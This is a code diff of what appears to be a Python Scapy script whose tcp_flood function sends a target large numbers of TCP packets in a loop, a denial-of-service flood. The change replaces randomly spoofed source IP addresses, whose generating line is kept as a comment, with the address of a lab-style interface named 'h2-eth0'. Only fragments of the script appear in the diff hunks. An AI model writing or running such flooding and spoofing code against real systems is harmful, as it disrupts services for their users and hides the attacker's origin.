@@ -6,9 +6,9 @@ from random import randint
 def tcp_flood(target_ip, target_port, num_packets):
     for _ in range(num_packets):
         # Generate random source IP and source port
-        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
-        # ip = get_if_addr("h1-eth0")
-        # src_ip = ip
+        # src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
+        ip = get_if_addr("h2-eth0")
+        src_ip = ip
         src_port = randint(1024, 65535)
 
         # Create an IP packet with the target IP as the destination
@@ -23,7 +23,7 @@ def tcp_flood(target_ip, target_port, num_packets):
         # Send the packet
         send(packet, verbose=0)
         print(f"Sent packet from {src_ip}:{src_port} to {target_ip}:{target_port}")
-        
+
 
 if __name__ == "__main__":
     if len(sys.argv) != 4:
